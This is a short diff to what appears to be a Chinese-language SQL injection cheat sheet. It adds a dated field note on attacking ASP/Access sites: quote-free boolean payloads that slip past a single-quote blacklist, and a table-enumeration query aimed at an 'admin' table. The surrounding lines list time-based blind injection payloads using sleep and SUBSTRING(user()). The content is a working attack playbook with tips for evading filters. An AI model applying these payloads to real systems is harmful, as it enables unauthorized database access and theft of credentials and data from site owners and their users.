@@ -67,6 +67,7 @@ id=1 AND 1=1
 id=1 AND sleep(5)
 id=1 AND IF(SUBSTRING(user(),1,1)='r',sleep(5),0)
 ```
+> **ASP/Access 实测注记（20260830）**：单引号黑名单拦截（统一弹"非法操作"页）时，数字型免引号 `AND 1=1 / AND 1=2` 布尔差分直通有效。Access 无 sleep——布尔差分是唯一时间无关通道；表枚举 `and (select count(*) from admin)>=0` 若被关键字过滤拦回，先观察过滤字典再定绕过，不要连续硬试。
 
 ### 2.5 时间盲注的双层延时（绕过 sleep 关键字）
 ```
